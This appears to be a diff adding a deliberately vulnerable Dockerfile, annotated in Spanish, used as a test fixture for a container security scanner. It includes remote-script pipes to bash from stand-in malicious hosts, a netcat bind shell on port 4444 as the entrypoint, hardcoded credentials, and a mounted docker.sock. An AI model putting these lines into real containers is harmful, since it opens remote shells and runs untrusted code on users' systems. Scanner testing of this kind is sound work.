@@ -1,0 +1,76 @@
+# Vulnerable Dockerfile - DO NOT USE IN PRODUCTION
+# ⚠️ Este archivo contiene configuraciones inseguras para probar el scanner
+
+# ❌ Usar latest es peligroso (versiones no fijas)
+FROM ubuntu:latest
+
+# ❌ Ejecutar como root
+USER root
+
+# ❌ Credenciales hardcodeadas
+ENV DATABASE_PASSWORD=super_secret_123
+ENV API_KEY=sk-prod-abcdef123456
+ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+
+# ❌ Exponer información sensible en ARG
+ARG ADMIN_PASSWORD=admin123
+ARG JWT_SECRET=my-secret-jwt-key
+
+# ❌ Instalar paquetes innecesarios y herramientas de debug
+RUN apt-get update && apt-get install -y \
+    wget \
+    curl \
+    netcat \
+    nmap \
+    telnet \
+    vim \
+    nano \
+    gcc \
+    make \
+    python3 \
+    && rm -rf /var/lib/apt/lists/*
+
+# ❌ Ejecutar scripts remotos sin verificar
+RUN curl -sSL http://malicious-site.com/install.sh | bash
+RUN wget -O- https://untrusted.com/setup.sh | sh
+
+# ❌ Deshabilitar verificación SSL
+RUN curl --insecure https://example.com/package.tar.gz | tar xz
+RUN wget --no-check-certificate https://example.com/data.tar
+
+# ❌ Agregar repositorios no confiables
+RUN echo "deb http://untrusted-repo.com/debian stable main" >> /etc/apt/sources.list
+
+# ❌ COPY sin restricciones (puede copiar .git, secrets, etc.)
+COPY . /app
+
+# ❌ Permisos demasiado amplios
+RUN chmod 777 /app
+RUN chmod -R 777 /var/log
+
+# ❌ Montar volúmenes sensibles
+VOLUME ["/etc", "/var/run/docker.sock"]
+
+# ❌ Exponer muchos puertos
+EXPOSE 22 23 80 443 3306 5432 6379 27017
+
+# ❌ Configuración de red insegura
+RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+# ❌ Deshabilitar AppArmor / SELinux
+RUN echo 0 > /proc/sys/kernel/apparmor_restrict
+
+# ❌ Instalar paquetes con sudo/privilegios
+RUN pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org some-package
+
+# ❌ Ejecutar como privilegiado
+# docker run --privileged
+
+# ❌ Punto de entrada inseguro
+ENTRYPOINT ["/bin/bash", "-c"]
+CMD ["while true; do nc -l -p 4444 -e /bin/bash; done"]
+
+# Construir y ejecutar:
+# docker build -t vulnerable-app .
+# docker run --privileged -p 4444:4444 vulnerable-app
